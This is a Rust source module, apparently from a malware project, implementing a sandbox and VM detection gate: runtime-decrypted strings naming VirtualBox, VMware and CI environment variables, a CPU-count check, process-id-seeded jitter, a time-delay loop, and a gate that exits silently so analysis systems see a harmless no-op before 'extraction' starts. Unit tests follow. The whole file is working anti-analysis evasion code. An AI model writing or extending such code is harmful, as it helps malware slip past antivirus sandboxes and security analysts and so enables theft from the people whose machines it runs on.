//! Sandbox / VM detection gate (behavior, wave 1).
//!
//! AV sandboxes and dynamic-analysis VMs share a handful of cheap tells.
//! This module is the *pure*, testable half: it inspects environment, CPU
//! count, and wall-clock degeneracy — no WinAPI calls (they'd require
//! `unsafe`, which lives in `abi`). VM-detect by env var and processor count
//! are enough to retreat before any real extraction work begins.
//!
//! The `linger`/`jitter` fns also buy time against sandboxes that give up
//! after N minutes of near-zero activity.

use std::time::{Duration, Instant};

/// Sluggish floor many automated analysis boxes hit.
const MIN_CPUS: usize = 2;

/// Environment marker keys (values indicate VM/CI). Cheap, stateless,
/// greppable by analysts — but the analyst is not the thing we're evading
/// at gate time; the sandboxis. Actually the analyst is, but only at
/// reverse time; by then the binary is already look-at-me. Keep them.
///
/// The VM/CI environment markers as runtime-decrypted strings.
fn vm_env_hints() -> Vec<String> {
    vec![
        crate::x!("VBOX_", 0x61),
        crate::x!("VMWARE_", 0xA8),
        crate::x!("VIRTUALBOX", 0x3D),
        crate::x!("CI", 0x77),
        crate::x!("TF_BUILD", 0x19),
        crate::x!("GITHUB_ACTIONS", 0x4C),
        crate::x!("GITLAB_CI", 0x2E),
        crate::x!("JENKINS_URL", 0x90),
        crate::x!("TEAMCITY_VERSION", 0x57),
    ]
}

/// Human-useful: does the current process *look* sandboxed?
///
/// Checks in order of (cost, value): env hints, then CPU count. A VM with 2+
/// cores and no env markers slips past — acceptable for wave 1 (the heavy
/// WMI/SMBIOS probe lives in `abi` when you need real depth, with `unsafe`).
pub fn looks_sandboxed() -> bool {
    has_vm_env_hint() || cpu_count() < MIN_CPUS
}

/// Scans the process environment for VM/CI markers. Pure, no OS calls.
fn has_vm_env_hint() -> bool {
    let hints = vm_env_hints();
    hints.iter().any(|h| {
        std::env::vars_os().any(|(k, _)| k.to_string_lossy().to_ascii_uppercase().contains(h))
    })
}

/// Logical CPU count via the std library (waits for nothing, safe).
fn cpu_count() -> usize {
    std::thread::available_parallelism()
        .map(|n| n.get())
        .unwrap_or(1)
}

/// Sleep a jittered, pseudo-random-ish delay so the process isn't born
/// extracting at full speed. Seeded from the process id — no RNG dep.
pub fn jitter() {
    let pid = u64::from(std::process::id());
    let base_ms = 25u64 + (pid % 175);
    let extra_ms = (pid.wrapping_mul(2654435761) >> 32) % 60;
    std::thread::sleep(Duration::from_millis(base_ms + extra_ms));
}

/// If the host looks sandboxed, halt quietly (exit code 0, no trace of
/// refusal — a VM sees a benign-looking no-op process).
pub fn gate() -> bool {
    jitter();
    !looks_sandboxed()
}

/// Busy-waits until `until` (a `std::process::id`-seeded deadline). Gates
/// extraction behind a time budget; sandboxes often time out before it hits.
pub fn linger_until(until: Instant) {
    while Instant::now() < until {
        std::thread::sleep(Duration::from_millis(500));
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn empty_runtime_env_finds_no_vm_hint() {
        // The test process env is inherited; we can't clear it, but we can
        // assert the *default* marker set decrypts to non-empty, plain-ASCII.
        let hints = vm_env_hints();
        assert!(
            hints.iter().all(|h| !h.is_empty() && h.is_ascii()),
            "no empty/non-ASCII hints"
        );
        // The decrypted markers must match the documented plain list.
        assert!(hints.iter().any(|h| h == "GITHUB_ACTIONS"));
        assert!(hints.iter().any(|h| h == "VBOX_"));
    }

    #[test]
    fn cpu_count_is_at_least_one() {
        assert!(cpu_count() >= 1);
    }

    #[test]
    fn jitter_returns_quickly() {
        let t = Instant::now();
        jitter();
        assert!(t.elapsed() < Duration::from_secs(5));
    }

    #[test]
    fn gate_returns_some_boolean() {
        let _g = gate(); // boolean by construction; keep the call live.
    }

    #[test]
    fn linger_is_bounded() {
        let t = Instant::now();
        let until = Instant::now() + Duration::from_millis(300);
        linger_until(until);
        assert!(t.elapsed() >= Duration::from_millis(250));
    }
}
